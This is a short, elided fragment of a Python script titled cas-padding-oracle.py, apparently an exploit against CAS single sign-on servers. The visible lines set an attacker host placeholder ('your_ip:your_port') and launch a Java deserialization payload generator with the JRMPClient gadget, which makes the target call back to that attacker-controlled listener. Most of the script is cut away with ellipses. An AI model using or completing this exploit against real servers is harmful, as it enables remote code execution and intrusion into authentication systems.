# -*- encoding: utf-8 -*-
'''
@File    :   cas-padding-oracle.py
@Time    :   2020/07/31 19:27:10
@Author  :   cl0und 
@Version :   1.0
...
jrmpServerAndPort = "your_ip:your_port"
...
if __name__ == '__main__':
    popen = subprocess.Popen(['java', '-jar', JAR_FILE, 'JRMPClient', jrmpServerAndPort],stdout=subprocess.PIPE)
